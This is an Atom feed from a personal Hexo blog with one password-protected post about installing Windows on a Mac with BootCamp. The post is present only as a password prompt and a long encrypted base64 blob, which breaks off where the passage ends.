<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-08-21T17:02:30.431Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BootCamp安装Windows笔记</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/21/mac-install-windows/mac-install-windows/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/21/mac-install-windows/mac-install-windows/</id>
    <published>2019-08-21T05:44:54.000Z</published>
    <updated>2019-08-21T17:02:30.431Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!">    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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